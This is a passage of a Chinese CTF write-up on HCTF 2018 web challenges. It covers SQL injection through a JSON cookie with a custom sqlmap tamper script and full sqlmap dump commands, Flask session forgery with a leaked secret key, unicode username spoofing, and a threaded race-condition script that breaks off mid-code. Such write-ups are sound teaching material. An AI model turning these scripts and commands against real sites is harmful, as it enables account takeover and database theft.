class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $ip = <span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) ? $_SERVER[<span class="string">'REMOTE_ADDR'</span>] : <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">        $list = explode(<span class="string">','</span>, $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</span><br><span class="line">        $ip = $list[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip2long($ip)) &#123;</span><br><span class="line">        $ip = <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现虽然可以用xff，但是有ip2long的验证，这条路不通。<br>那么看到admin的login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'user'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    $user = addslashes($_POST[<span class="string">'user'</span>]);</span><br><span class="line">    $pass = addslashes($_POST[<span class="string">'pass'</span>]);</span><br></pre></td></tr></table></figure></p><p>上来就发现过滤，应该也无法突破。<br>那么只能看include文件夹里有什么突破点了，看到member.php<br>发现突破口：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"islogin"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"login_data"</span>]) &#123;</span><br><span class="line">        $login_data = json_decode($_COOKIE[<span class="string">'login_data'</span>], <span class="keyword">true</span>);</span><br><span class="line">        $admin_user = $login_data[<span class="string">'admin_user'</span>];</span><br><span class="line">        $udata = $DB-&gt;get_row(<span class="string">"SELECT * FROM fish_admin WHERE username='$admin_user' limit 1"</span>);</span><br><span class="line">        <span class="keyword">if</span> ($udata[<span class="string">'username'</span>] == <span class="string">''</span>) &#123;</span><br><span class="line">            setcookie(<span class="string">"islogin"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">            setcookie(<span class="string">"login_data"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $admin_pass = sha1($udata[<span class="string">'password'</span>] . LOGIN_KEY);</span><br><span class="line">        <span class="keyword">if</span> ($admin_pass == $login_data[<span class="string">'admin_pass'</span>]) &#123;</span><br><span class="line">            $islogin = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setcookie(<span class="string">"islogin"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">            setcookie(<span class="string">"login_data"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在做admin校验的时候用了弱比较<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($admin_pass == $login_data[<span class="string">'admin_pass'</span>]) </span><br><span class="line">&#123;</span><br><span class="line">    $islogin = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>那么我们可以尝试fuzz admin_pass，从数字0开始跑，跑到65发现成功登陆admin<br><img src="/images/2018-11-09-21-41-38.png" alt=""></p><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>该方法来自于大哥Ricterz，鬼才真的是鬼才，方法如下：<br>我们发现在用cookie做身份校验的时候查询了数据库<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_COOKIE[<span class="string">"login_data"</span>]) &#123;</span><br><span class="line">        $login_data = json_decode($_COOKIE[<span class="string">'login_data'</span>], <span class="keyword">true</span>);</span><br><span class="line">        $admin_user = $login_data[<span class="string">'admin_user'</span>];</span><br><span class="line">        $udata = $DB-&gt;get_row(<span class="string">"SELECT * FROM fish_admin WHERE username='$admin_user' limit 1"</span>);</span><br></pre></td></tr></table></figure></p><p>发现其中用了<code>json_decode</code>，那么我们可以尝试使用编码进行bypass，即可无视一切过滤进行注入<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = payload.replace(<span class="string">'u'</span>, <span class="string">'\u0075'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'o'</span>, <span class="string">'\u006f'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'i'</span>, <span class="string">'\u0069'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'\''</span>, <span class="string">'\u0027'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'\"'</span>, <span class="string">'\u0022'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">' '</span>, <span class="string">'\u0020'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'s'</span>, <span class="string">'\u0073'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'#'</span>, <span class="string">'\u0023'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'&gt;'</span>, <span class="string">'\u003e'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'&lt;'</span>, <span class="string">'\u003c'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'-'</span>, <span class="string">'\u002d'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'='</span>, <span class="string">'\u003d'</span>)</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-11-10-10-44-24.png" alt=""><br><img src="/images/2018-11-10-10-44-35.png" alt=""><br>于是尝试数据库注入，打开神器sqlmap，编写一下tamper：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    data = <span class="string">'''&#123;"admin_user":"admin%s","admin_pass":65&#125;;'''</span></span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(<span class="string">'u'</span>, <span class="string">'\u0075'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'o'</span>, <span class="string">'\u006f'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'i'</span>, <span class="string">'\u0069'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'\''</span>, <span class="string">'\u0027'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'\"'</span>, <span class="string">'\u0022'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">' '</span>, <span class="string">'\u0020'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'s'</span>, <span class="string">'\u0073'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'#'</span>, <span class="string">'\u0023'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'&gt;'</span>, <span class="string">'\u003e'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'&lt;'</span>, <span class="string">'\u003c'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'-'</span>, <span class="string">'\u002d'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'='</span>, <span class="string">'\u003d'</span>)</span><br><span class="line">    <span class="keyword">return</span> data % payload</span><br></pre></td></tr></table></figure></p><p>然后我们知道，目标肯定是Mysql，且这里用bool注入即可，那么我们指定bool盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--technique=B</span><br></pre></td></tr></table></figure></p><p>指定数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--dbms=mysql</span><br></pre></td></tr></table></figure></p><p>于是我们可以尝试探测一下数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt --tamper=hctf --dbms=mysql --technique=B --dbs</span><br></pre></td></tr></table></figure></p><p>但是蛋疼的事来了，sqlmap告诉我们没有漏洞，原因肯定是sqlmap对回显识别有问题，所以我们尝试指定错误时候的回显<br><img src="/images/2018-11-10-15-39-33.png" alt=""><br>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--not-string=window.location</span><br></pre></td></tr></table></figure></p><p>然后加点线程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--thread=10</span><br></pre></td></tr></table></figure></p><p>最后有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt --tamper=hctf --dbms=mysql --thread=10 --technique=B --not-string=window.location --dbs</span><br></pre></td></tr></table></figure></p><p>即可愉快的得到结果<br><img src="/images/2018-11-10-11-35-06.png" alt=""><br>然后指定库名跑表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt --tamper=hctf --dbms=mysql --thread=10 --technique=B --not-string=window.location -D hctf_kouzone --tables</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-11-10-11-34-58.png" alt=""><br>指定表名跑列名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt --tamper=hctf --dbms=mysql --thread=10 --technique=B --not-string=window.location -D hctf_kouzone -T F1444g --columns</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-11-10-11-35-17.png" alt=""><br>最后在跑flag的时候又遇到跑不出来的问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt --tamper=hctf --dbms=mysql --thread=10 --technique=B --not-string=window.location -D hctf_kouzone -T F1444g -C F1a9 --dump</span><br></pre></td></tr></table></figure></p><p>看一下tamper<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = payload.lower()</span><br></pre></td></tr></table></figure></p><p>因为我们把payload转小写了，于是我们把它转回去<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = payload.replace(<span class="string">'f1a9'</span>, <span class="string">'F1a9'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'f1'</span>, <span class="string">'F1'</span>)</span><br></pre></td></tr></table></figure></p><p>即可愉快的得到flag<br><img src="/images/2018-11-10-11-35-22.png" alt=""><br>即可拿到flag</p><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>有幸拿到了这道题的1血，也在赛后的交流讨论中，发现了一些新的思路，总结一下3个做法：</p><ul><li>法1：伪造session</li><li>法2：unicode欺骗</li><li>法3：条件竞争</li></ul><h3 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>拿到题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://admin.2018.hctf.io/</span><br></pre></td></tr></table></figure></p><p>f12查看源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- you are not admin --&gt;</span><br></pre></td></tr></table></figure></p><p>发现提示要成为admin<br>随便注册个账号，登入后，在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://admin.2018.hctf.io/change</span><br></pre></td></tr></table></figure></p><p>发现提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span><br></pre></td></tr></table></figure></p><p>于是下载源码</p><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><p>拿到代码后，简单的查看了下路由<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/index')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/register', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/change', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/edit', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">()</span>:</span></span><br></pre></td></tr></table></figure></p><p>查看一下路由，功能非常单一：登录，改密码，退出，注册，edit。<br>但edit功能也是个假功能，并且发现并不会存在sql注入之类的问题，也没有文件写入或者是一些危险的函数，此时陷入了困境。</p><h3 id="解法一：session伪造"><a href="#解法一：session伪造" class="headerlink" title="解法一：session伪造"></a>解法一：session伪造</h3><h4 id="初步探索"><a href="#初步探索" class="headerlink" title="初步探索"></a>初步探索</h4><p>想到的第一个方法：session伪造<br>于是尝试伪造session，根据ph写的文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.leavesongs.com/PENETRATION/client-session-security.html</span><br></pre></td></tr></table></figure></p><p>可以知道flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。<br>所以我们构造脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure></p><p>然后可以尝试读取我们的session内容<br><img src="/images/2018-11-10-16-03-07.png" alt=""><br>此时容易想到伪造admin得到flag，因为看到代码中<br><img src="/images/2018-11-10-16-03-45.png" alt=""><br>想到把name伪造为admin，于是github上找了个脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/noraj/flask-session-cookie-manager</span><br></pre></td></tr></table></figure></p><p>尝试伪造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;u&apos;csrf_token&apos;: &apos;bedddc7469bf16ac02ffd69664abb7abf7e3529c&apos;, u&apos;user_id&apos;: u&apos;1&apos;, u&apos;name&apos;: u&apos;admin&apos;, u&apos;image&apos;: &apos;aHme&apos;, u&apos;_fresh&apos;: True, u&apos;_id&apos;: &apos;26a01e32366425679ab7738579d3ef6795cad198cd94529cb495fcdccc9c3c864f851207101b38feb17ea8e7e7d096de8cad480b656f785991abc8656938182e&apos;&#125;</span><br></pre></td></tr></table></figure></p><p>但是需要<code>SECRET_KEY</code><br>我们发现config.py中存在<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY = os.environ.get(<span class="string">'SECRET_KEY'</span>) <span class="keyword">or</span> <span class="string">'ckj123'</span></span><br></pre></td></tr></table></figure></p><p>于是尝试<code>ckj123</code><br><img src="/images/2018-11-10-16-07-13.png" alt=""><br>但是比赛的时候很遗憾，最后以失败告终，当时以为key不是<code>SECRET_KEY</code>，就没有深究<br>后来发现问题<code>https://graneed.hatenablog.com/entry/2018/11/11/212048</code><br>似乎python3和python2的flask session生成机制不同<br><img src="/images/2018-11-12-20-09-38.png" alt=""><br>改用python3生成即可成功伪造管理员<br><img src="/images/2018-11-12-20-10-01.png" alt=""></p><h3 id="解法二：Unicode欺骗"><a href="#解法二：Unicode欺骗" class="headerlink" title="解法二：Unicode欺骗"></a>解法二：Unicode欺骗</h3><h4 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h4><p>在非常迷茫的时候，肯定想到必须得结合改密码功能，那会不会是change这里有问题，于是仔细去看代码，发现这样一句<br><img src="/images/2018-11-10-16-08-25.png" alt=""><br>好奇怪，为什么要转小写呢？<br>难道注册的时候没有转大小写吗？<br><img src="/images/2018-11-10-16-09-34.png" alt=""><br><img src="/images/2018-11-10-16-09-42.png" alt=""><br>但随后发现注册和登录都用了转小写，注册<code>ADMIN</code>的计划失败<br>但是又有一个特别的地方，我们python转小写一般用的都是lower()，为什么这里是strlower()?<br>有没有什么不一样的地方呢？于是想到跟进一下函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span>:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure></p><p>本能的去研究了一下<code>nodeprep.prepare</code><br>找到对应的库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/twisted/twisted</span><br></pre></td></tr></table></figure></p><p>这个方法很容易懂，即将大写字母转为小写<br>但是很快就容易发现问题<br><img src="/images/2018-11-10-16-31-23.png" alt=""><br><img src="/images/2018-11-10-16-31-45.png" alt=""><br>版本差的可真多，十有八九这里有猫腻</p><h4 id="unicode问题"><a href="#unicode问题" class="headerlink" title="unicode问题"></a>unicode问题</h4><p>后来搜到这样一篇文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e</span><br></pre></td></tr></table></figure></p><p>对于如下字母<br><img src="/images/2018-11-10-16-56-24.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘʀꜱᴛᴜᴠᴡʏᴢ</span><br></pre></td></tr></table></figure></p><p>具体编码可查<code>https://unicode-table.com/en/search/?q=small+capital</code><br><code>nodeprep.prepare</code>会进行如下操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴀ -&gt; A -&gt; a</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-11-10-16-55-41.png" alt=""><br>即第一次将其转换为大写，第二次将其转换为小写<br>那么是否可以用来bypass题目呢？</p><h4 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h4><p>我们容易想到一个攻击链：</p><ul><li>注册用户ᴀdmin</li><li>登录用户ᴀdmin，变成Admin</li><li>修改密码Admin，更改了admin的密码</li></ul><p>于是成功得到如下flag<br><img src="/images/2018-11-10-14-14-53.png" alt=""></p><h4 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h4><p>这里的unicode欺骗，让我想起了一道sql注入题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skysec.top/2018/03/21/从一道题深入mysql字符集与比对方法collation/</span><br></pre></td></tr></table></figure></p><h3 id="解法三：条件竞争"><a href="#解法三：条件竞争" class="headerlink" title="解法三：条件竞争"></a>解法三：条件竞争</h3><p>该方法也是赛后交流才发现的，感觉有点意思</p><h4 id="代码审计-2"><a href="#代码审计-2" class="headerlink" title="代码审计"></a>代码审计</h4><p>我们发现代码在处理session赋值的时候<br><img src="/images/2018-11-12-20-14-29.png" alt=""><br><img src="/images/2018-11-12-20-14-45.png" alt=""><br>两个危险操作，一个登陆一个改密码，都是在不安全check身份的情况下，直接先赋值了session<br>那么这里就会存在一些风险<br>那么我们设想，能不能利用这一点，改掉admin的密码呢？<br>例如：</p><ul><li>我们登录sky用户，得到session a</li><li>用session a去登录触发admin赋值</li><li>改密码，此时session a已经被更改为session b了，即session name=admin</li><li>成功更改admin的密码</li></ul><p>但是构想是美好的，这里存在问题，即前两步中，如果我们的Session a是登录后的，那么是无法再去登录admin的<img src="/images/2018-11-12-20-39-30.png" alt=""><br>我们会在第一步直接跳转，所以这里需要条件竞争</p><h4 id="条件竞争思路"><a href="#条件竞争思路" class="headerlink" title="条件竞争思路"></a>条件竞争思路</h4><p>那么能不能避开这个check呢？<br>答案是显然的，我们双线并进<br>当我们的一个进程运行到改密码<br><img src="/images/2018-11-12-20-40-48.png" alt=""><br>这里的时候<br>我们的另一个进程正好退出了这个用户，并且来到了登录的这个位置<br><img src="/images/2018-11-12-20-41-42.png" alt=""><br>此时正好session name变为admin，change密码正好更改了管理员密码</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>这里直接用研友syang@Whitzard的脚本了<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(s, username, password)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: password,</span><br><span class="line">        <span class="string">'submit'</span>: <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">"http://admin.2018.hctf.io/login"</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s.get(<span class="string">"http://admin.2018.hctf.io/logout"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(s, newpassword)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'newpassword'</span>:newpassword</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">"http://admin.2018.hctf.io/change"</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(s)</span>:</span></span><br><span class="line">    login(s, <span class="string">'skysec'</span>, <span class="string">'skysec'</span>)</span><br><span class="line">    change(s, <span class="string">'skysec'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span><span class="params">(s)</span>:</span></span><br><span class="line">    logout(s)</span><br><span class="line">    res = login(s, <span class="string">'admin'</span>, <span class="string">'skysec'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'&lt;a href="/index"&gt;/index&lt;/a&gt;'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(<span class="string">'finish'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 